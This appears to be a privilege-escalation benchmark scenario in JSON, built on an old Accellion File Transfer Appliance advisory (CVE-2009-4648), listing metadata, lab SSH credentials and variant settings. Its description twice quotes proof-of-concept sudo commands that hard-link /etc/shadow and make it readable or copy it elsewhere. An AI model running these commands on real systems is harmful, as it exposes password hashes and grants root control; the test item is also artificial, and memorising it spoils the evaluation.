@@ -1,0 +1,31 @@
+{
+  "scenario_id": "edb_33623_v1",
+  "type": "variant",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "difficulty": "medium",
+  "steps_expected": 4,
+  "description": "Linux privilege escalation: Accellion Secure File Transfer Appliance - Multiple Command Restriction / Privilege Escalations (CVE-2009-4648;OSVDB-62522)\n\nExploit source code (33623.txt):\n```\nsource: https://www.securityfocus.com/bid/38176/info\n\nAccellion File Transfer Appliance is prone to multiple remote vulnerabilities, including:\n\n- Multiple privilege-escalation issues\n- A directory-traversal issue\n- An HTML-injection issue\n- A remote command-injection issue\n\nAn attacker may leverage these issues to execute arbitrary script code within the context of the webserver, steal cookie-based authentication credentials, obtain sensitive information, and execute arbitrary code or commands with superuser privileges. Other attacks are also possible.\n\nThe following proofs of concept are available:\n\nsh-2.05b$ ln /etc/shadow /home/admin/oldtemp\nsh-2.05b$ sudo /bin/chmod 666 /home/admin/oldtemp\n\nsh-2.05b$ ln /etc/shadow /home/admin/temp\nsh-2.05b$ sudo /bin/cp /home/admin/temp /etc/mail/sendmail.cf\n\nsh-2.05b$ sudo /usr/local/bin/admin.pl\n```",
+  "detailed_description": "Linux privilege escalation: Accellion Secure File Transfer Appliance - Multiple Command Restriction / Privilege Escalations (CVE-2009-4648;OSVDB-62522)\n\nExploit source code (33623.txt):\n```\nsource: https://www.securityfocus.com/bid/38176/info\n\nAccellion File Transfer Appliance is prone to multiple remote vulnerabilities, including:\n\n- Multiple privilege-escalation issues\n- A directory-traversal issue\n- An HTML-injection issue\n- A remote command-injection issue\n\nAn attacker may leverage these issues to execute arbitrary script code within the context of the webserver, steal cookie-based authentication credentials, obtain sensitive information, and execute arbitrary code or commands with superuser privileges. Other attacks are also possible.\n\nThe following proofs of concept are available:\n\nsh-2.05b$ ln /etc/shadow /home/admin/oldtemp\nsh-2.05b$ sudo /bin/chmod 666 /home/admin/oldtemp\n\nsh-2.05b$ ln /etc/shadow /home/admin/temp\nsh-2.05b$ sudo /bin/cp /home/admin/temp /etc/mail/sendmail.cf\n\nsh-2.05b$ sudo /usr/local/bin/admin.pl\n```",
+  "variant_of": "edb_33623",
+  "ground_truth_exploit": "exploit.sh",
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "docker_feasibility": "L1",
+  "ssh_user": "testuser",
+  "ssh_pass": "t3stP@ss",
+  "ssh_port": 22,
+  "variant_dimensions": [
+    "D1_username",
+    "D2_password",
+    "D3_root_password",
+    "D4_hostname",
+    "D5_noise_suid",
+    "D6_decoy_users",
+    "D7_noise_cron",
+    "D8_motd_banner",
+    "D9_decoy_history",
+    "D10_extra_packages"
+  ]
+}
